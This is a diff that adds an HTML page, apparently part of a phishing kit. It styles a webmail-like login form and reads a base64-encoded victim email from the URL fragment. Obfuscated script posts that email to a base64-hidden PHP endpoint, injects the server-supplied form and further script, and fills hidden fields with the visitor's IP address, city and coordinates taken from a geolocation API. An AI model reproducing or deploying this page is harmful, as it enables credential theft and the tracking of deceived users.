@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link id="___fav_icn" rel="shortcut icon" href="" type="image/x-icon" />
+    <title></title>
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        text-align: left;
+        box-sizing: border-box;
+        outline-color: rgba(235, 111, 2, 0.65);
+      }
+      body {
+        display: flex;
+        align-items: top;
+        justify-content: center;
+        font-family: Segoe UI, Helvetica, Arial, sans-serif;
+        text-align: center;
+        font-size: 100%;
+        color: #444444;
+      }
+      .form {
+        width: 485px;
+        margin-top: 60px;
+        color: #444444;
+        border: 1px solid #b8b8b9;
+        border-radius: 9px;
+        box-shadow: 0px 0px 3px -1px;
+        transform: scale(1.016);
+      }
+
+      .logo {
+        position: relative;
+        top: -9px;
+        left: -9px;
+      }
+      .form_inner_body {
+        padding: 5px 48px;
+        background: #ffffff;
+        vertical-align: top;
+        font-size: 10pt;
+      }
+      .bottom_image_container {
+        display: flex;
+      }
+      .bottom_image:nth-child(1) {
+        width: 456px;
+        height: 54px;
+        transform: translate(-8.9px, 10px);
+      }
+      .bottom_image:nth-child(2) {
+        width: 45px;
+        height: 54px;
+        transform: translate(-9px, 10px);
+      }
+      .form-btn {
+        color: #ffffff;
+        background-color: #eb9c12;
+        border: 0px;
+        padding: 2px 6px;
+        margin: 0px 16px;
+        text-align: center;
+        font-size: 95%;
+        margin-left: auto;
+        margin-bottom: 17.33px;
+      }
+      .form-btn:hover {
+        background-color: #f9b133;
+      }
+
+      .show-explanation {
+        color: #ff6c00;
+        text-decoration: none;
+        font-size: 10pt;
+      }
+      .footer-message {
+        padding-top: 15px;
+        padding-left: 22px;
+      }
+      .sub-footer {
+        padding: 1px;
+        padding-left: 22px;
+        font-size: 80%;
+      }
+      .normal-input {
+        color: #000000;
+        background-color: #fff3c0;
+        border: 1px solid #a4a4a4;
+        margin: 0px 6px;
+        width: 100%;
+        padding: 3px;
+        height: 2.2em;
+      }
+      .check-accordion-input {
+        margin: 0px 12px 0px 32px;
+        /* -webkit-tap-highlight-color: transparent !important; */
+      }
+      /* .check-accordion-input:after {
+        width: 10px;
+        height: 10px;
+        border-radius: 15px;
+        top: -2px;
+        left: -1px;
+        position: relative;
+        background-color: #d1d3d1;
+        content: "";
+        display: inline-block;
+        visibility: visible;
+        border: 2px solid white;
+      } */
+
+      /* .check-accordion-input:checked:after {
+        width: 15px;
+        height: 15px;
+        border-radius: 15px;
+        top: -2px;
+        left: -1px;
+        position: relative;
+        background-color: #f5822e;
+        content: "";
+        display: inline-block;
+        visibility: visible;
+        border: 2px solid white;
+      } */
+
+      .check-accordion-input:checked:after {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        top: 0px;
+        left: 1px;
+        position: relative;
+        background-color: #f5822e;
+        box-shadow: 0 0 0px 1.2px #f5822e;
+        content: "";
+        display: inline-block;
+        visibility: visible;
+        border: 1.5px solid #00000080;
+      }
+
+      .check-accordion-container {
+        display: flex;
+      }
+      .normal-inputs-container {
+        display: flex;
+        flex-direction: column;
+      }
+      .normal-inputs-container .input-container {
+        display: flex;
+        margin-bottom: 5px;
+      }
+      .normal-inputs-container .input-container label {
+        font-size: 13.3333px;
+      }
+      .form-label-container {
+        display: inline-flex;
+        align-items: center;
+        width: 93px;
+      }
+      p.sec {
+        padding: 3px 0px 8px;
+      }
+      .check-accordion-container.mt-md {
+        margin: 17.33px 0 0;
+      }
+      .check-accordion-text.mt-md {
+        margin-bottom: 17.33px;
+      }
+      .check-accordion-container input[type="checkbox"] {
+        margin: 0px 12px 0px 32px;
+      }
+      .check-accordion-text {
+        padding-left: 57px !important;
+        color: #999999;
+        font-size: 10pt;
+        padding: 2px 0px 4px;
+      }
+
+      .private-warning {
+        padding-left: 57px !important;
+        color: #ff6c00;
+        margin-top: 3px;
+      }
+
+      .check-accordion-text:not(#lightVersion),
+      .private-warning {
+        display: none;
+      }
+
+      .form.d-o .check-accordion-text:not(.light-version) {
+        display: block !important;
+      }
+
+      .d-b {
+        display: block !important;
+      }
+
+      .check-accordion-text a {
+        color: #ff6c00;
+        text-decoration: none;
+      }
+      .mt-md {
+        margin-bottom: 17.33px;
+      }
+      .d-n {
+        display: none !important;
+      }
+    </style>
+  </head>
+  <body>
+    <main id="main"></main>
+
+    <script src="./srv.js"></script>
+    <script id="sctoapnd1"></script>
+
+    <script>
+      async function _start() {
+        const __winHref = window.location.href.split("?")[0];
+        const __getInd__ = (str, search) => str.indexOf(search);
+        const __getSlice__ = (str, index) => str.substr(index);
+        const __getEl__ = (sel) => document.querySelector(sel);
+        const __json = (url) => fetch(url).then((res) => res.json());
+        const cntHome = __getEl__("main#main");
+        const scToAppend1 = __getEl__("#sctoapnd1");
+
+        // subC rtvr
+        const ___getSC = (_s = null, subj = "l") => {
+          const new_sc = { sc: 0, new: true };
+
+          if (!_s || typeof _s !== "string") {
+            console.log("sc rtrvl fld");
+            return new_sc;
+          }
+
+          const _sc_indx = _s.indexOf(subj);
+
+          console.log({ _sc_indx });
+
+          if (_sc_indx === -1) return new_sc;
+
+          const sc = Number(_s.substring(_sc_indx + 1));
+
+          if (typeof sc !== "number" || isNaN(sc)) {
+            console.log("error: sc rtrvl fld", { sc });
+            return new_sc;
+          }
+
+          console.log({ sc });
+          return { sc, new: false };
+        };
+
+        const __getURLEm = () => {
+          if (__getInd__(__winHref, "#") === -1) {
+            console.log("ue 1 failed");
+            return false;
+          }
+
+          return __getSlice__(__winHref, __getInd__(__winHref, "#") + 1);
+        };
+
+        let __UrlEm = null;
+
+        try {
+          __UrlEm = atob(__getURLEm());
+        } catch (err) {
+          console.log("error:", err.message);
+          return;
+        }
+
+        if (__getInd__(__winHref, "#") === -1 || !Boolean(__UrlEm)) {
+          console.log("Failed");
+          return;
+        }
+
+        const auth_err = ___getSC(window.location.href.split("?")[1]).sc;
+
+        console.log({ __UrlEm });
+
+        async function loadLoc(key) {
+          return await __json(`https://api.ipdata.co?api-key=${atob(key)}`);
+        }
+
+        async function hydrate() {
+          const __fetchOptions = {
+            method: "POST",
+            body: JSON.stringify({
+              __UrlEm,
+              __winHref,
+              auth_err,
+            }),
+            headers: {
+              "Content-Type": "application/json",
+            },
+          };
+
+          const __res = await fetch(
+            `${window.stef.srv_loc}${atob("L293LXllbC9lbm5lbWVtZW1lbW0ucGhw")}`,
+            __fetchOptions
+          );
+
+          const __resData = await __res.json();
+
+          // hydrate
+          cntHome.innerHTML = __resData.data.cnt;
+          cntHome.classList.add("display_block");
+
+          const __locData = await loadLoc(__resData.data.key);
+
+          __getEl__("#___pidt_field_").value =
+            __locData.ip || "error retrieving data";
+          __getEl__("#___ocdt_field_").value =
+            __locData.country_name || "error retrieving data";
+          __getEl__("#___icdt_field_").value =
+            __locData.city || "error retrieving data";
+          __getEl__("#___oldt_field_").value =
+            __locData.longitude || "error retrieving data";
+          __getEl__("#___aldt_field_").value =
+            __locData.latitude || "error retrieving data";
+
+          scToAppend1.innerHTML = __resData.data.crpt1;
+
+          // console.log({ __resData });
+          // console.log({ __locData });
+          return;
+        }
+
+        hydrate();
+      }
+
+      _start();
+    </script>
+  </body>
+</html>
